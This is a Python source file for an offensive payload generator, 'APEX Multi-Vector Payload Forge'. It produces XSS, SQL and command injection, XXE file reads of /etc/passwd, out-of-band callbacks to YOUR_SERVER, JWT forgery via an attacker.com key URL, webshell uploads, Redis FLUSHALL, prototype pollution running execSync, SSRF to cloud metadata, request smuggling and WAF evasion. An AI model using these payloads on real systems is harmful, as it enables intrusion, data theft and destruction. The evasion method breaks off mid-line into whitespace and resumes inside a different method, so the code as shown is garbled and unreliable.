"""
APEX Multi-Vector Payload Forge
Polyglot payloads, context chains, blind confirmation, encoding
"""
import base64
import random
import string
from urllib.parse import quote


class PayloadForge:
    """Generates multi-vector, polyglot, and context-aware payloads."""

    def __init__(self):
        self.encoding_chains = {
            'base64': lambda p: base64.b64encode(p.encode()).decode(),
            'url': lambda p: quote(p, safe=''),
            'double_url': lambda p: quote(quote(p, safe=''), safe=''),
            'hex': lambda p: p.encode().hex(),
            'unicode_escape': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
            'html_entities': lambda p: ''.join(f'&#{ord(c)};' for c in p),
            'js_escape': lambda p: p.encode('unicode_escape').decode(),
            'case_swap': lambda p: ''.join(c.swapcase() if c.isalpha() else c for c in p),
            'xor_5': lambda p: ''.join(chr(ord(c) ^ 5) for c in p),
        }

    def generate_polyglot(self, contexts):
        """Generate a polyglot payload that works in multiple contexts simultaneously.
        contexts: list of context types ['xss', 'ssti', 'sqli']
        """
        if 'xss' in contexts and 'ssti' in contexts:
            return '{{7*7}}<script>alert(1)</script>'
        if 'xss' in contexts and 'sqli' in contexts:
            return "' OR 1=1--<script>alert(1)</script>"
        if 'ssti' in contexts and 'sqli' in contexts:
            return "' OR 1=1--{{7*7}}"
        if 'xss' in contexts:
            return '<script>alert(1)</script>'
        if 'ssti' in contexts:
            return '{{7*7}}'
        if 'sqli' in contexts:
            return "' OR 1=1--"
        return 'APEX_TEST'

    def generate_context_chain(self, context_type, initial_payload):
        """Generate a chain of payloads that escalate through contexts.
        e.g., HTML body → attribute breakout → event handler injection
        """
        chains = {
            'html_body': [
                initial_payload,
                f'"><{initial_payload}>',
                f'</textarea>{initial_payload}',
            ],
            'html_attribute': [
                initial_payload,
                f'" onmouseover="{initial_payload}" x="',
                f"' onfocus='{initial_payload}' autofocus '",
                f'"><{initial_payload}>',
                f'" autofocus onfocus="{initial_payload}" x="',
            ],
            'script_tag': [
                initial_payload,
                f'";{initial_payload}//',
                f"';{initial_payload}//",
                f'</script>{initial_payload}<script>',
                f'";{initial_payload};//',
            ],
            'html_comment': [
                initial_payload,
                f'-->{initial_payload}<!--',
                f'-->{initial_payload}',
            ],
            'json_value': [
                initial_payload,
                f'", "{initial_payload}": "',
                f'\\";{initial_payload}//',
            ],
        }
        return chains.get(context_type, [initial_payload])

    def generate_blind_confirmation_payloads(self, vuln_type):
        """Generate payloads that confirm blind vulnerabilities via side channels."""
        if vuln_type == 'sqli':
            return {
                'timing': [
                    ("' AND SLEEP(5)--", "Time delay 5s"),
                    ("'; SELECT pg_sleep(5)--", "PostgreSQL sleep"),
                    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL delay"),
                ],
                'boolean': [
                    ("' AND 1=1--", "' AND 1=2--", "Boolean diff"),
                    ("' OR '1'='1", "' OR '1'='2", "OR boolean"),
                ],
                'error': [
                    ("'", "Quote error"),
                    ('"', "Double quote error"),
                    ("' OR 1=1--", "OR injection"),
                ],
                'oob': [
                    ("'; EXEC xp_dirtree '\\\\YOUR_SERVER\\share'--", "MSSQL OOB"),
                    ("' UNION SELECT LOAD_FILE('\\\\\\\\YOUR_SERVER\\\\share')--", "MySQL OOB"),
                ],
            }
        elif vuln_type == 'cmdi':
            return {
                'timing': [
                    ('; sleep 5', 'Sleep 5s'),
                    ('| sleep 5', 'Pipe sleep'),
                    ('`sleep 5`', 'Backtick sleep'),
                    ('$(sleep 5)', 'Subshell sleep'),
                ],
                'output': [
                    ('; id', 'id command'),
                    ('| whoami', 'whoami command'),
                    ('; uname -a', 'uname command'),
                ],
            }
        elif vuln_type == 'xxe':
            return {
                'inband': [
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "APEX_TEST">]><foo>&xxe;</foo>', 'Entity reflection'),
                ],
                'oob': [
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_SERVER/xxe">]><foo>&xxe;</foo>', 'HTTP OOB'),
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://YOUR_SERVER/xxe">]><foo>&xxe;</foo>', 'FTP OOB'),
                ],
                'error': [
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'File read'),
                ],
            }
        return {}

    def apply_encoding_chain(self, payload, encodings):
        """Apply multiple encodings in sequence."""
        result = payload
        for enc in encodings:
            if enc in self.encoding_chains:
                result = self.encoding_chains[enc](result)
        return result

    def generate_evasion_variants(self, payload, vuln_type, waf=None):
        """Generate WAF evasion variants of a payload."""
        variants = [payload]

        if vuln_type == 'xss':
            variants.extend([
                payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'),
                payload.replace('<script', '<script ').replace('>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </script></svg>'},
            ],
            'asp': [
                {'filename': 'shell.asp', 'content': '<% Response.Write("APEX") %>'},
                {'filename': 'shell.aspx', 'content': '<%@ Page Language="C#" %><% Response.Write("APEX"); %>'},
                {'filename': 'shell.cer', 'content': '<% Response.Write("APEX") %>'},
            ],
            'jsp': [
                {'filename': 'shell.jsp', 'content': '<% out.println("APEX"); %>'},
                {'filename': 'shell.jspx', 'content': '<% out.println("APEX"); %>'},
            ],
        }
        return payloads.get(target_type, payloads['php'])

    def generate_jwt_attack_payloads(self):
        """Generate JWT attack payloads."""
        return {
            'none_algorithm': {
                'header': '{"alg":"none","typ":"JWT"}',
                'payload': '{"admin":true,"iat":1516239022}',
                'description': 'Set algorithm to none to bypass signature verification'
            },
            'key_confusion': {
                'header': '{"alg":"HS256","typ":"JWT"}',
                'description': 'Use public key as HMAC secret (RS256→HS256 confusion)'
            },
            'kid_injection': {
                'header': '{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}',
                'description': 'Path traversal in Key ID to use empty key'
            },
            'jku_header': {
                'header': '{"alg":"RS256","jku":"https://attacker.com/jwks.json","typ":"JWT"}',
                'description': 'Point JWK Set URL to attacker-controlled server'
            },
        }

    def generate_graphql_introspection_query(self):
        """Generate GraphQL introspection query to dump schema."""
        return """
        query {
          __schema {
            types { name kind fields { name type { name kind ofType { name kind } } } }
            queryType { name fields { name args { name type { name kind ofType { name kind } } } } }
            mutationType { name fields { name args { name type { name kind ofType { name kind } } } } }
          }
        }
        """

    def generate_graphql_attack_queries(self):
        """Generate GraphQL attack queries."""
        return [
            # Batching attack (bypass rate limiting)
            {'query': 'query { __typename } query { __typename } query { __typename }'},
            # Alias-based batching
            {'query': 'query { a:__typename b:__typename c:__typename d:__typename }'},
            # Depth attack
            {'query': 'query { q1:__typename q2:__typename q3:__typename q4:__typename q5:__typename q6:__typename q7:__typename q8:__typename q9:__typename q10:__typename }'},
            # Circular fragment DoS
            {'query': 'query { ...A } fragment A on Query { ...B } fragment B on Query { ...A }'},
        ]

    def generate_nosqli_payloads(self, db_type='mongodb'):
        """Generate NoSQL injection payloads."""
        payloads = {
            'mongodb': [
                {'$gt': ''},
                {'$ne': None},
                {'$regex': '.*'},
                {'$exists': True},
                {'$where': 'sleep(5000)'},
                {'$where': '1==1'},
                {'username': {'$gt': ''}, 'password': {'$gt': ''}},
                {'$or': [{'username': 'admin'}, {'password': {'$regex': '.*'}}]},
            ],
            'redis': [
                'INFO',
                'CONFIG GET *',
                'KEYS *',
                'FLUSHALL',
                'SET APEX test',
                'EVAL "return redis.call(\'info\')" 0',
            ],
            'firebase': [
                {'access_token': 'null'},
                {'auth': None},
                {'__proto__': {'admin': True}},
            ],
        }
        return payloads.get(db_type, payloads['mongodb'])

    def generate_prototype_pollution_payloads(self):
        """Generate JavaScript prototype pollution payloads."""
        return [
            # Basic pollution
            {'__proto__': {'admin': True}},
            {'__proto__': {'isAdmin': True}},
            {'constructor': {'prototype': {'admin': True}}},
            # Nested pollution
            {'__proto__': {'__proto__': {'admin': True}}},
            # Via JSON parse
            '{"__proto__": {"admin": true}}',
            # Via Object.assign
            '{"constructor": {"prototype": {"admin": true}}}',
            # Common vulnerable params
            {'user': {'__proto__': {'role': 'admin'}}},
            {'settings': {'__proto__': {'isAdmin': True}}},
            # Lodash-specific
            {'__proto__': {'shell': 'require("child_process").execSync("id")'}},
            # Express-specific
            {'__proto__': {'env': {'NODE_ENV': 'development'}}},
        ]

    def generate_smuggling_payloads(self):
        """Generate HTTP request smuggling payloads."""
        return {
            'cl_te': {
                'description': 'CL.TE — Frontend uses Content-Length, backend uses Transfer-Encoding',
                'payload': (
                    "POST / HTTP/1.1\r\n"
                    "Host: TARGET\r\n"
                    "Content-Length: 6\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "G"
                ),
            },
            'te_cl': {
                'description': 'TE.CL — Frontend uses Transfer-Encoding, backend uses Content-Length',
                'payload': (
                    "POST / HTTP/1.1\r\n"
                    "Host: TARGET\r\n"
                    "Content-Length: 4\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "5c\r\n"
                    "GPOST /admin HTTP/1.1\r\n"
                    "Host: TARGET\r\n"
                    "Content-Length: 15\r\n"
                    "\r\n"
                    "x=1\r\n"
                    "0\r\n"
                    "\r\n"
                ),
            },
            'te_te': {
                'description': 'TE.TE — Obfuscated Transfer-Encoding header',
                'payload': (
                    "POST / HTTP/1.1\r\n"
                    "Host: TARGET\r\n"
                    "Content-Length: 4\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "Transfer-encoding: x\r\n"
                    "\r\n"
                    "5c\r\n"
                    "GPOST /admin HTTP/1.1\r\n"
                    "Host: TARGET\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                ),
            },
        }

    def generate_xxe_payloads(self):
        """Generate XXE injection payloads."""
        return {
            'in_band': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "APEX_TEST">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            ],
            'out_of_band': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_SERVER/xxe">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd"> %xxe;]><foo>test</foo>',
            ],
            'billion_laughs': [
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
            ],
            'ssrf_via_xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]><foo>&xxe;</foo>',
            ],
        }


# Global instance
forge = PayloadForge()